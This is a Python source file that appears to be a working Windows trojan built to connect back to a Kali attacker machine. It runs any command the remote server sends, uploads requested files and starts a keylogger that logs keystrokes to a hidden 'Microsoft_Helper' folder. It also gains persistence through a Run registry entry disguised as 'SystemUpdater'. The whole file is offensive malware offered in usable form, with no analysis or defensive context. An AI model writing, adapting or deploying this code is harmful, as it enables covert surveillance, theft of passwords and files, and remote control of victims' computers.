import socket  
import subprocess  
import sys  
import winreg  
import os  
from pynput.keyboard import Listener  
import threading  
 
HOST = '192.168.100.43'  # Replace with Kali IP  
PORT = 4444  
 
# Dynamic log file path  
LOG_DIR = os.path.join(os.environ['APPDATA'], 'Microsoft_Helper')  
LOG_FILE = os.path.join(LOG_DIR, 'logs.txt')  
os.makedirs(LOG_DIR, exist_ok=True)  
os.system(f'attrib +h "{LOG_DIR}"')  
 
# Keylogger  
class Keylogger:  
    def __init__(self):  
        self.listener = None  
 
    def on_press(self, key):  
        try:
            char = key.char  # Get the actual character (e.g., 'a', 'b')
        except AttributeError:
            # Handle special keys (e.g., Space, Enter)
            char = f' [{key.name}] '  # e.g., "[space]", "[enter]"
        with open(LOG_FILE, 'a', encoding='utf-8') as f:  
            f.write(f'{char}')  # Add newline to separate keystrokes  
 
    def start(self):  
        if not self.listener:  
            self.listener = Listener(on_press=self.on_press)  
            self.listener.start()  
            return True  
        return False  
 
keylogger = Keylogger()  
 
# Trojan  
def add_to_startup():  
    key = winreg.OpenKey(  
        winreg.HKEY_CURRENT_USER,  
        r'Software\Microsoft\Windows\CurrentVersion\Run',  
        0, winreg.KEY_SET_VALUE  
    )  
    winreg.SetValueEx(key, 'SystemUpdater', 0, winreg.REG_SZ, sys.argv[0])  
    key.Close()  
 
def connect_to_server():  
    while True:  
        try:  
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
            client.connect((HOST, PORT))  
            while True:  
                cmd = client.recv(1024).decode()  
                if cmd.lower() == 'exit':  
                    client.close()  
                    sys.exit(0)  
                elif cmd.startswith('download'):
                    try:
                        file_name = cmd.split(' ', 1)[1]
                        if os.path.isfile(file_name):
                            with open(file_name, 'rb') as f:
                                data = f.read()
                                client.sendall(data)
                            client.send(b'EOF')  # End marker for valid file
                        else:
                            # Send error message followed by EOF to unblock the server
                            client.send(b"Error: File not found.")
                            client.send(b'EOF')  # <-- Critical fix
                    except IndexError:
                        client.send(b"Error: Missing filename. Usage: download <file>")
                        client.send(b'EOF')
                    except Exception as e:
                        client.send(f"Error: {str(e)}".encode())
                        client.send(b'EOF')
                elif cmd == 'start_keylogger':  
                    if keylogger.start():  
                        client.send(b"[+] Keylogger started!")  
                    else:  
                        client.send(b"[!] Keylogger already running.")
                elif cmd.lower().strip() == 'persistence':  
                    add_to_startup()  
                    client.send(b"[+] Persistence activated!")  
                else:  
                    output = subprocess.getoutput(cmd)  
                    client.send(output.encode())  
        except Exception as e:  
            continue  
 
if __name__ == "__main__":  
    connect_to_server()  